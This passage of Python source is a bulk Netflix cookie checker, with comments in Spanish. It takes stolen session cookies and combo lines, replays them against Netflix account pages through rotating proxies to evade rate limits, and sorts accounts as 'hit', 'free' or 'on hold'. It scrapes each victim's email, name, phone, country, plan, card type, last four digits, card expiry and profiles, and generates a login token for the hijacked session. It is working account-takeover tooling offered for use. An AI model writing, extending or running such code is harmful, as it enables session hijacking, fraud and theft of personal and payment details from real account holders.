            s.headers.update(BROWSER_HEADERS)
            _tl_session.session = s
            _tl_session.using_curl = True
        else:
            s = requests.Session()
            s.headers.update(BROWSER_HEADERS)
            _retries = requests.adapters.Retry(
                total=0,
                backoff_factor=0,
                status_forcelist=[500, 502, 503, 504],
            )
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=8, pool_maxsize=16, max_retries=_retries
            )
            s.mount("https://", adapter)
            s.mount("http://", adapter)
            _tl_session.session = s
            _tl_session.using_curl = False
    return _tl_session.session, _tl_session.using_curl


def _make_session(bulk_mode: bool):
    return _get_pooled_session()


def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool = False) -> dict:
    cookie_text = cookie_text.strip()

    combo = parse_combo_line(cookie_text)
    if combo:
        cookies = combo.pop("cookies")
        file_meta = combo
    else:
        file_meta = extract_file_metadata(cookie_text)
        cookies = auto_parse_cookies(cookie_text)

    if not cookies:
        m = _NETFLIX_ID_RE.search(cookie_text)
        if m:
            val = m.group(1).strip().rstrip('",;|\')')
            if val:
                cookies = {"NetflixId": val}

    if not cookies:
        return {"status": "error", "message": "Could not parse any cookies from this file."}

    session_cookies = {"NetflixId", "SecureNetflixId", "nfvdid", "gsid"}
    if not any(k in cookies for k in session_cookies):
        return {
            "status": "invalid",
            "message": f"No Netflix session cookies found. Got: {', '.join(list(cookies.keys())[:8])}",
        }

    _proxy_timeout  = 2 if bulk_mode else 3
    _direct_timeout = 5 if bulk_mode else 7
    session, using_curl = _make_session(bulk_mode)

    nft_result: dict = {"success": False, "error": "skipped"}

    def _fetch_account():
        _proxy_active = _PROXY_ENABLED and _proxy_manager and _proxy_manager.enabled
        RACE_N = 6

        def _purl(pd):
            return (pd.get("https") or pd.get("http") or "") if pd else ""

        def _one_attempt(proxy_dict, url):
            t = _proxy_timeout if proxy_dict else _direct_timeout
            try:
                r = session.get(
                    url,
                    cookies=cookies,
                    timeout=t,
                    allow_redirects=True,
                    **({"proxies": proxy_dict} if proxy_dict else {}),
                )
                if _is_rate_limited(r.status_code, r.text):
                    if proxy_dict and _proxy_manager:
                        _proxy_manager.mark_failure(_purl(proxy_dict), hard=True)
                    return "FAIL", ""
                if r.status_code in (401, 403):
                    return "INVALID", r.text
                if _is_login_page(r.url, r.text):
                    if proxy_dict and _proxy_manager:
                        _proxy_manager.mark_failure(_purl(proxy_dict))
                    return "LOGIN", r.text
                if r.status_code == 200 and len(r.text) > 1000:
                    if proxy_dict and _proxy_manager:
                        _proxy_manager.mark_success(_purl(proxy_dict))
                    return "OK", r.text
                return "FAIL", ""
            except Exception as exc:
                logger.debug("_one_attempt error: %s", exc)
                if proxy_dict and _proxy_manager:
                    _proxy_manager.mark_failure(_purl(proxy_dict), hard=True)
                return "FAIL", ""

        def _race(url):
            proxies = [_proxy_manager.get_proxies_dict() for _ in range(RACE_N)]
            proxies = [p for p in proxies if p]
            if not proxies:
                return _one_attempt(None, url)

            race_timeout = _proxy_timeout + 0.5
            with _cf.ThreadPoolExecutor(max_workers=len(proxies)) as rpool:
                futs = {rpool.submit(_one_attempt, p, url): p for p in proxies}
                login_hits = 0
                last_login_html = ""
                try:
                    for fut in _cf.as_completed(futs, timeout=race_timeout):
                        try:
                            status, html = fut.result()
                        except Exception:
                            continue
                        if status == "OK":
                            return "OK", html
                        if status == "INVALID":
                            return "INVALID", html
                        if status == "LOGIN":
                            login_hits += 1
                            last_login_html = html
                            if login_hits >= len(proxies):
                                return "INVALID", last_login_html
                except _cf.TimeoutError:
                    pass

            return _one_attempt(None, url)

        if _proxy_active:
            status, html = _race("https://www.netflix.com/account/membership")
            if status == "OK":
                return "OK", html
            if status == "INVALID":
                return "INVALID", html
            if not bulk_mode:
                status, html = _race("https://www.netflix.com/browse")
                if status in ("OK", "INVALID"):
                    return status, html
            return "ERROR", ""
        else:
            url = "https://www.netflix.com/account/membership"
            status, html = _one_attempt(None, url)
            if status in ("OK", "INVALID"):
                return status, html
            if not bulk_mode:
                status, html = _one_attempt(None, "https://www.netflix.com/browse")
                if status in ("OK", "INVALID"):
                    return status, html
            return "ERROR", ""

    def _fetch_nftoken():
        return generate_nftoken(cookies)

    try:
        if generate_token:
            pool = _cf.ThreadPoolExecutor(max_workers=2)
            f_account = pool.submit(_fetch_account)
            f_nft     = pool.submit(_fetch_nftoken)
            acct_status, acct_text = f_account.result()
            try:
                nft_result = f_nft.result(timeout=6.0)
            except _cf.TimeoutError:
                nft_result = {"success": False, "error": "generating…"}
            finally:
                pool.shutdown(wait=False)
        else:
            acct_status, acct_text = _fetch_account()

        if acct_status == "INVALID":
            return {"status": "invalid", "message": "Cookie is expired or invalid (Netflix redirected to login)."}
        if acct_status == "ERROR" or not acct_text:
            return {"status": "error", "message": "Could not reach Netflix account page."}

        account_html = acct_text
        result: dict = {"status": "hit"}

        result["netflix_id"]        = cookies.get("NetflixId", "")
        result["secure_netflix_id"] = cookies.get("SecureNetflixId", "")
        result["nfvdid"]            = cookies.get("nfvdid", "")
        result["phone"]             = file_meta.get("phone") or ""
        result["password"]          = file_meta.get("password") or ""

        userinfo = _extract_userinfo(account_html)

        # ── Estado de membresía ───────────────────────────────────────────────
        ms_status = ""
        if userinfo:
            ms_status = (userinfo.get("membershipStatus") or "").upper()

        if ms_status in ("FORMER_MEMBER", "NEVER_MEMBER", "VOLUNTARILY_CANCELLED", "CANCELLED"):
            result["status"] = "free"
        elif ms_status in ("ON_HOLD", "PAYMENT_HOLD", "PAYMENT_DUE", "SUSPENDED"):
            result["status"] = "on_hold"
            _ms_issue_map = {
                "SUSPENDED":    "Account suspended — access restricted",
                "PAYMENT_DUE":  "Payment due — account on hold",
                "PAYMENT_HOLD": "Payment on hold — update payment method",
                "ON_HOLD":      "Account on hold (payment failed)",
            }
            _pre_issue = _ms_issue_map.get(ms_status, f"Account status: {ms_status}")

        result["membership_status"] = ms_status or "Unknown"
        result["is_in_free_trial"]  = userinfo.get("isInFreeTrial", False) if userinfo else False

        # ── Problemas y alertas de la cuenta ──────────────────────────────────
        issues = _detect_account_issues(account_html)
        try:
            _pre = _pre_issue
            if _pre and not any(_pre.lower().split()[0] in i.lower() for i in issues):
                issues = [_pre] + issues
        except NameError:
            pass
        result["account_issues"] = issues

        # ── Correo electrónico ────────────────────────────────────────────────
        email = None
        if userinfo:
            raw_email = userinfo.get("emailAddress") or userinfo.get("email")
            if raw_email and "@" in str(raw_email):
                email = str(raw_email)
        if not email:
            html_decoded = _decode_js_hex(account_html)
            for pat in [
                r'"emailAddress"\s*:\s*"([^"@]+@[^"]+)"',
                r'"email"\s*:\s*"([^"@]{1,60}@[^"]{3,60})"',
            ]:
                m = re.search(pat, html_decoded)
                if m:
                    cand = m.group(1).strip()
                    if "@" in cand and "." in cand.split("@")[1]:
                        email = cand
                        break
        result["email"] = email or file_meta.get("email") or "Hidden"
        result["email_verified"] = _extract_email_verified(account_html)

        # ── Nombre del titular ────────────────────────────────────────────────
        name = file_meta.get("name") or ""
        if not name and userinfo:
            raw_name = userinfo.get("name") or userinfo.get("firstName") or userinfo.get("displayName")
            if raw_name:
                cand = str(raw_name).strip()
                # Descarta si el titular es simplemente "1" o números de telemetría
                if cand not in ("1", "null", "undefined") and not cand.isdigit() and not any(x in cand.lower() for x in ("netflix", "plan", "standard", "premium", "basic", "mobile")):
                    name = cand
        result["name"] = name or ""

        # ── Teléfono ──────────────────────────────────────────────────────────
        if not result["phone"]:
            result["phone"] = _extract_phone(account_html) or ""

        # ── Plan y calidad ────────────────────────────────────────────────────
        plan_info = _extract_member_plan(account_html)

        plan_name   = plan_info.get("plan_name")   or file_meta.get("plan_name")   or ""
        quality     = plan_info.get("quality")     or file_meta.get("quality")     or ""
        max_streams = plan_info.get("max_streams") or file_meta.get("max_streams") or ""

        if plan_name and (not quality or not max_streams):
            for key, info in PLAN_MAP.items():
                if key in plan_name.lower():
                    quality     = quality     or info["quality"]
                    max_streams = max_streams or str(info["streams"])
                    break

        if not plan_name:
            for key, info in PLAN_MAP.items():
                if key in account_html.lower():
                    plan_name   = info["name"]
                    quality     = quality     or info["quality"]
                    max_streams = max_streams or str(info["streams"])
                    break

        result["plan_name"]        = plan_name   or "Unknown"
        result["quality"]          = quality     or "Unknown"
        result["max_streams"]      = max_streams or "Unknown"
        result["has_ads"]          = plan_info.get("has_ads", False)
        result["is_on_hold"]       = plan_info.get("is_on_hold", False)
        result["num_extra_members"]= plan_info.get("num_extra_members", 0)

        if result["is_on_hold"] and result["status"] == "hit":
            result["status"] = "on_hold"
            existing = result.get("account_issues") or []
            if not any("on hold" in i.lower() for i in existing):
                result["account_issues"] = list(existing) + ["Account on hold (payment failed)"]

        # ── País ──────────────────────────────────────────────────────────────
        country = None
        if userinfo:
            country = userinfo.get("countryOfSignup") or userinfo.get("memberCountry")
        if not country:
            html_decoded = _decode_js_hex(account_html)
            for pat in [r'"countryOfSignup"\s*:\s*"([A-Z]{2,3})"', r'"memberCountry"\s*:\s*"([A-Z]{2})"']:
                m = re.search(pat, html_decoded)
                if m:
                    country = m.group(1).strip()
                    break
        result["country"] = country or file_meta.get("country") or "Unknown"

        # ── Miembro desde ─────────────────────────────────────────────────────
        member_since = None
        if userinfo:
            raw = userinfo.get("memberSince") or userinfo.get("joinDate") or userinfo.get("startDate")
            if raw:
                member_since = _parse_date(str(raw))
        if not member_since:
            html_decoded = _decode_js_hex(account_html)
            for pat in [r'"memberSince"\s*:\s*"([^"]+)"', r'"startDate"\s*:\s*"([^"]+)"']:
                m = re.search(pat, html_decoded, re.IGNORECASE)
                if m:
                    member_since = _parse_date(m.group(1).strip())
                    if member_since:
                        break
        result["member_since"] = member_since or file_meta.get("member_since") or "Unknown"

        # ── Pago y Facturación ────────────────────────────────────────────────
        pay_info = _extract_payment_info(account_html)
        payment  = pay_info.get("payment") or ""
        if not payment:
            html_decoded = _decode_js_hex(account_html)
            for pat in [r'"paymentType"\s*:\s*"([^"]+)"', r'"creditCardType"\s*:\s*"([^"]+)"',
                        r'\b(Visa|Mastercard|VISA|MASTERCARD|American Express|PayPal|Discover|Amex)\b']:
                m = re.search(pat, html_decoded, re.IGNORECASE)
                if m:
                    payment = m.group(1).strip()
                    break
        result["payment"]       = payment or file_meta.get("payment") or "Unknown"
        result["card_type"]     = pay_info.get("card_type")   or ""
        result["card_last4"]    = pay_info.get("card_last4")  or ""
        result["card_expiry"]   = pay_info.get("card_expiry") or ""
        result["card_expired"]  = pay_info.get("card_expired", False)
        result["is_third_party"]= pay_info.get("is_third_party", False)
        result["partner_name"]  = pay_info.get("partner_name") or ""

        # Próxima facturación
        next_billing = (
            plan_info.get("next_billing")
            or _extract_billing_date_from_html(account_html)
            or file_meta.get("next_billing")
            or ""
        )
        if result["status"] == "free":
            next_billing = next_billing or "N/A (cancelled)"
        result["next_billing"] = next_billing or "Unknown"

        # Precio
        price_raw = (
            plan_info.get("price")
            or _extract_price_from_html(account_html)
            or file_meta.get("price")
            or ""
        )
        result["price"] = _clean_price(price_raw) if price_raw else "Unknown"

        # Respaldo para facturación por terceros (IndiHome, Spark NZ, etc.)
        partner_label = result["partner_name"]
        card_t = str(result["card_type"])
        pay_t = str(result["payment"])
        is_3rd = result["is_third_party"] or bool(partner_label) or "3rd party" in pay_t.lower() or "3rd party" in card_t.lower()

        if is_3rd:
            prov = partner_label or card_t.split("(")[0].strip() or pay_t.split("(")[0].strip() or "Terceros"
            if result["next_billing"] in ("Unknown", "Desconocido", None, ""):
                result["next_billing"] = f"Facturado por {prov}"
            if result["price"] in ("Unknown", "Desconocido", None, ""):
                result["price"] = f"Incluido con {prov}"

        # ── Perfiles reales (Consulta ManageProfiles / browse) ────────────────
        pnames = []
        pcount = 0
        try:
            r_prof = session.get(
                "https://www.netflix.com/ManageProfiles",
                cookies=cookies,
                timeout=4,
                allow_redirects=True
            )
            if r_prof.status_code == 200 and len(r_prof.text) > 1000:
                pnames, pcount = _extract_profiles_list(r_prof.text)
        except Exception:
            pass

        # Si ManageProfiles no respondió o no dio perfiles, probar /browse
        if not pnames and pcount <= 1:
            try:
                r_br = session.get(
                    "https://www.netflix.com/browse",
                    cookies=cookies,
                    timeout=4,
                    allow_redirects=True
                )
                if r_br.status_code == 200 and len(r_br.text) > 1000:
                    br_names, br_count = _extract_profiles_list(r_br.text)
                    if br_names or br_count > pcount:
                        pnames, pcount = br_names, br_count
            except Exception:
                pass

        # Si ninguno dio perfiles, usar el respaldo de account_html
        if not pnames and pcount == 0:
            pnames, pcount = _extract_profiles_list(account_html)

        result["profile_names"] = pnames
        result["profile_count"] = pcount if pcount > 0 else (len(pnames) if pnames else 1)
        result["profiles"]      = result["profile_count"]

        # ── Comprobación final de cuenta en espera (On Hold) ──────────────────
        if result["status"] == "hit" and (result["is_on_hold"] or
                "on hold" in account_html.lower() or "payment hold" in account_html.lower()):
            result["status"] = "on_hold"

        if result["status"] == "on_hold" and not result.get("account_issues"):
            _ms = result.get("membership_status", "")
            _sync_issue_map = {
                "SUSPENDED":    "Account suspended — access restricted",
                "PAYMENT_DUE":  "Payment due — account on hold",
                "PAYMENT_HOLD": "Payment on hold — update payment method",
                "ON_HOLD":      "Account on hold (payment failed)",
            }
            if _ms and _ms in _sync_issue_map:
                _sync_msg = _sync_issue_map[_ms]
            elif result.get("is_on_hold"):
                _sync_msg = "Account on hold (payment failed)"
            else:
                _sync_msg = "Account on hold — payment issue detected"
            result["account_issues"] = [_sync_msg]

        result["nftoken"] = nft_result
        return result

    except requests.exceptions.Timeout:
        return {"status": "error", "message": "Request timed out. Netflix may be blocking this IP."}
    except requests.exceptions.ConnectionError:
        return {"status": "error", "message": "Connection error. Check internet connectivity."}
    except Exception as e:
        err_name = type(e).__name__
        err_msg = str(e)
        if "timed out" in err_msg.lower() or "timeout" in err_msg.lower() or err_name in ("TimeoutError", "ConnectTimeoutError"):
            return {"status": "error", "message": "Request timed out (curl). Netflix may be rate-limiting."}
        if "connection" in err_msg.lower() or err_name in ("ConnectionError", "ConnectError"):
            return {"status": "error", "message": "Connection error (curl). Check network connectivity."}
        if "ssl" in err_msg.lower() or "certificate" in err_msg.lower():
            return {"status": "error", "message": "SSL/TLS error. Netflix may have updated its certificate chain."}
        logger.exception("Unexpected error in check_cookie")
        return {"status": "error", "message": f"Unexpected error ({err_name}): {err_msg[:200]}"}
